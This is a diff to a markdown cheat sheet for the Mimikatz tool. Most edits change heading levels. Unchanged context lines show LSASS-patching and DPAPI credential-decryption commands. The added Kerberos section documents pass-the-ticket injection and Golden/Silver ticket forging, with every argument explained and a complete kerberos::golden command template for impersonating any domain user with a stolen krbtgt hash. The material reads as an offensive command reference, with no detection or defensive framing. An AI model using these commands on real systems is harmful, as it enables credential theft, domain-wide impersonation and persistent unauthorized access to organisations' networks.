@@ -1,8 +1,8 @@
 # MIMIKATZ
 
-## Author: https://github.com/gentilkiwi/mimikatz
+# Author: https://github.com/gentilkiwi/mimikatz
 
-### Miscellaneous
+## Miscellaneous
 
 1) Shows privileges on machine ( Ensure output is "20 OK")
 
@@ -22,7 +22,7 @@ Prevent LSASS from checking the credential type
 
     sekurlsa::patch 
 
-### Credentials Dumping
+## Credentials Dumping
 
 1) Windows Vault stored credentials dumping (passwords and authentication tokens)
 
@@ -166,3 +166,64 @@ OR
 
        dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C"
 
+## Kerberos
+
+#### This module can operate without any special privileges and facilitates the creation of offline 'Golden Tickets;, which are long-duration TGT tickets for any user.
+
+ 1) Pass-the-Ticket (PtT)
+
+#### Injects one or multiple Kerberos tickets into the current session 
+
+### Arguments:
+
+##### Filename = The ticket's filename (multiple can be used)
+
+##### Directory = A directory path. All .kirbi files inside will be injected
+
+       kerberos::ptt Administrator@krbtgt-WHATEVER.LOCAL.kirbi
+
+ 2) Golden/Silver
+
+#### Creates Kerberos tickets (TGT or TGS) with arbitrary data for any user. 
+
+### Arguments:
+
+##### /domain = Fully Qualified Domain Name (FQDN)
+
+##### /sid = SID of the domain (S-1-5-21-1342342452-45634534534543-253523534533)
+
+##### /user = Username to impersonate
+
+##### /id = User ID (Default UserID is 500 for administrator)
+
+##### /groups = Group IDs the user belongs to  (comma-separated)
+
+### Key Arguments:
+
+##### /rc4 or /krbtgt = The NTLM Hash (krbtgt is golden ticket)
+
+##### /aes128 = The AES128 key
+
+##### /aes256 = The AES256 key
+
+### Target and Service for Silver Ticket:
+
+##### /target = Server/computer name where the service is hosted
+
+##### /service = Service name for the ticket
+
+### Target ticket:
+
+##### /ticket = Filename for output (default is ticket.kirbi)
+
+##### /ptt = Inject the golden ticket into the current session without saving to file
+
+### Lifetime Arguments:
+
+##### /startoffset = Start offset (in minutes)
+
+##### /endin = Duration of the ticket (in minutes)
+
+##### /renewmax = Maximum renewal duration (in minutes)
+
+       kerberos::golden /user:USER_TO_IMPERSONATE /domain:DOMAIN.LOCAL /sid:SID_OF_THE_DOMAIN /krbtgt:KRBTGT_NTLM_HASH /id:USER_ID /groups:GROUP_ID_USER_BELONGS_TO /ticket:USER_TO_IMPERSONATE.DOMAIN.kirbi
